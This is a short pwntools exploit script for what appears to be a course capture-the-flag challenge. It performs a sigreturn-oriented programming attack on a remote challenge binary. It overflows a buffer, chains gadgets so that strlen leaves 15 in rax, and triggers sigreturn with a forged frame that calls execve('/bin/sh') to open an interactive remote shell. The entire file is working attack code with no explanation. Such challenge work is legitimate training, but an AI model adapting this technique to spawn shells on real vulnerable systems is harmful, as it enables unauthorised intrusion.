from pwn import *

binary = './chal.bin'

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

p = remote("cse4850-srop-1.chals.io", 443, ssl=True, sni="cse4850-srop-1.chals.io")

syscall = r.find_gadget(['syscall'])[0]
str_15 = 0x4020c9 + 2		# 17 -2
bin_sh = 0x4011ba
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret = pop_rdi + 1

#p = start()

''' execve(/bin/sh) '''
frame = SigreturnFrame()
frame.rax = constants.SYS_execve # rax = sys_execve (0x3b)
frame.rdi = bin_sh		 # rdi = fake stack (0x41500)->/bin/sh
frame.rsi = 0x0			 # rsi = NULL (0x0)
frame.rdx = 0x0			 # rdx = NULL (0x0)
frame.rip = syscall

chain = b'A' * 16 		 # buffer + base pointer
chain += p64(ret)

chain += p64(pop_rdi)		 # pop rax, ret
chain += p64(str_15)		 # filled rdi
chain += p64(e.sym['strlen'])	 # calling strlen so 15 is in rax

chain += p64(syscall)		 # syscall 15
chain += bytes(frame)

p.sendline(chain)		 # send second stage -> forces execve()

p.interactive()
